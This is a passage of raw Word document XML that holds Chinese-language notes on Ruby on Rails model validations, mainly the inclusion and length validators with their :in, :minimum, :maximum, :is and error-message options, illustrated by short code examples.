                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; { :in</w:t>
            </w:r>
            <w:r w:rsidRPr="00CE1FEC">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00CE1FEC">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; %w(small medium large),</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="382E5CE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:message</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "%{value} is not a valid size"</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65AE8A2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5112E4F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inclusion</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 校验通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:in</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来指定一个集合，用来验证属性的取值不包含在该集合中。你也可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:in</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项的别名 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:within</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。上面的例子使用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:message</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>选项来演示了你可以在错误信息中引用属性的值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE68BF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该校验的默认错误信息为 “</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is not included in the list</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139400A3" w14:textId="34B86B53"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3.7 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>length</w:t>
      </w:r>
      <w:r w:rsidR="00C4218B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 字符串长度</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE91D6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该校验用来验证属性值的长度。它提供了多种选项来指定长度的约束条件</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7296"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="03FA820E" w14:textId="77777777" w:rsidTr="00F346C1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D197DA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75F6B1A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:name, :length</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :</w:t>
            </w:r>
            <w:r w:rsidRPr="00F346C1">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>minimum</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 2</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140A5E2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:bio, :length</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :</w:t>
            </w:r>
            <w:r w:rsidRPr="00F346C1">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>maximum</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 500</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6CCA31F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:password, :length</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :</w:t>
            </w:r>
            <w:r w:rsidRPr="00F346C1">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>in</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 6..20</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23EBB4F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:registration_number, :length</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :</w:t>
            </w:r>
            <w:r w:rsidRPr="00F346C1">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>is</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 6</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248B02E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3C5C006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有以下几种约束选项：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3088DE97" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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w:t>
      </w:r>
      <w:r w:rsidRPr="00EF7D39">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>minimum</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 该属性值的长度</w:t>
      </w:r>
      <w:r w:rsidRPr="00F346C1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>不能小于</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>指定的长度。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD018E8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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w:t>
      </w:r>
      <w:r w:rsidRPr="00EF7D39">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>maximum</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 该属性值的长度</w:t>
      </w:r>
      <w:r w:rsidRPr="00F346C1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>不能大于</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>指定的长度.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03582BCA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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w:t>
      </w:r>
      <w:r w:rsidRPr="00EF7D39">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (or </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00EF7D39">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>within</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) – 该属性值的</w:t>
      </w:r>
      <w:r w:rsidRPr="00EF7D39">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>长度必须包含在指定的区间中</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="00EF7D39">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>所以这个选项的值必须是 range 对象</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68949E00" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>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w:t>
      </w:r>
      <w:r w:rsidRPr="00EF7D39">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 该属性值的</w:t>
      </w:r>
      <w:r w:rsidRPr="00EF7D39">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>长度必须等于指定的长度</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287E59F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该校验的默认错误信息依赖于所执行的长度校验的类型。你可以通过使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:wrong_length</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:too_long</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:too_short</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项以及 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%{count}</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 作为所使用的相应长度约束的占位符来自由的订制信息。而且你仍然可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:message</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来指定错误信息.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8256"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="3FAA34EF" w14:textId="77777777" w:rsidTr="00EF7D39">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="124F1FA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007DC38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:bio, :length</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :</w:t>
            </w:r>
            <w:r w:rsidRPr="00EF7D39">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>maximum</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 1000,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73C2C99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EF7D39">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>too_long</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "%{count} characters is the maximum allowed"</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12BB8A0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FBD963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该校验默认通过统计字母个数来计算长度，但是你也</w:t>
      </w:r>
      <w:r w:rsidRPr="00C4218B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">可以通过指定 </w:t>
      </w:r>
      <w:r w:rsidRPr="00C4218B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
